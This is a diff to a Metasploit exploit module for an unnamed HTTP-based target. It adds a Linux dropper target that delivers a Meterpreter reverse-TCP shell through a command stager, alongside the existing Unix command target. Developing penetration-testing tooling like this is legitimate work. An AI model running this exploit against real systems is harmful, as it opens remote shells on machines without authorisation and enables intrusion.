@@ -4,9 +4,10 @@
 ##
 
 class MetasploitModule < Msf::Exploit::Remote
-  Rank = NormalRanking # https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html
+  Rank = GoodRanking
 
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
 
   def initialize(info = {})
     super(
@@ -27,6 +28,15 @@ class MetasploitModule < Msf::Exploit::Remote
           'BadChars' => "\x00"
         },
         'Targets' => [
+          [
+            'Linux (Dropper)',
+            {
+              'Platform' => 'linux',
+              'Arch' => [ARCH_X64],
+              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' },
+              'Type' => :linux_dropper
+            }
+          ],
           [
             'Unix Command',
             {
@@ -92,6 +102,9 @@ class MetasploitModule < Msf::Exploit::Remote
     case target['Type']
       when :unix_cmd
         execute_command(payload.encoded)
+      when :linux_dropper
+        execute_cmdstager
       end
   end
 end
+  
